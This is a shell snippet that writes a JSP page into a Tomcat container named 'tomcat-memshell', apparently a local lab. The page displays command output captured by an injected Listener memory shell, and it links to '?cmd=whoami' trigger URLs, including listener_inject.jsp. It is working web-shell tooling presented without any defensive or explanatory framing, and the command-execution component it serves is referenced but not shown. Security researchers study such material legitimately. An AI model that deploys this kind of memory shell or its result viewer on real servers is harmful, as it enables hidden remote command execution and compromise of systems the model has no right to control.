docker exec -it tomcat-memshell bash

cat > /usr/local/tomcat/webapps/ROOT/memshell/show_result.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>

<%
    // 尝试从 request 属性中读取结果
    String result = (String) request.getAttribute("listener_result");
    String cmd = (String) request.getAttribute("listener_cmd");
    
    // 如果没找到，尝试从 session 中读取（备用）
    if (result == null || result.isEmpty()) {
        result = (String) session.getAttribute("listener_result");
        cmd = (String) session.getAttribute("listener_cmd");
    }
    
    // 如果还是没找到，检查 request 参数中是否有 debug 信息
    String debug = request.getParameter("debug");
    
    if (result != null && !result.isEmpty()) {
        out.println("<html><body><pre>");
        out.println("[+] 命令: " + cmd + "\n");
        out.println("[+] ============================================\n");
        out.println(result);
        out.println("\n[+] ============================================");
        out.println("</pre></body></html>");
    } else {
        out.println("<html><body>");
        out.println("<h3>⚠️ 暂无命令执行结果</h3>");
        out.println("<p>请先触发 Listener：</p>");
        out.println("<ul>");
        out.println("<li><a href='" + request.getContextPath() + "/?cmd=whoami'>" + 
                    request.getContextPath() + "/?cmd=whoami</a></li>");
        out.println("<li><a href='" + request.getContextPath() + "/memshell/listener_inject.jsp?cmd=whoami'>" + 
                    request.getContextPath() + "/memshell/listener_inject.jsp?cmd=whoami</a></li>");
        out.println("</ul>");
        
        // debug 模式显示所有 attribute
        if ("true".equals(debug)) {
            out.println("<hr/>");
            out.println("<h4>Debug: 当前 request 中的所有属性</h4>");
            out.println("<table border='1'>");
            out.println("<tr><th>属性名</th><th>属性值</th></tr>");
            java.util.Enumeration<String> names = request.getAttributeNames();
            while (names.hasMoreElements()) {
                String name = names.nextElement();
                out.println("<tr><td>" + name + "</td><td>" + request.getAttribute(name) + "</td></tr>");
            }
            out.println("</table>");
        }
        
        out.println("</body></html>");
    }
%>
EOF

exit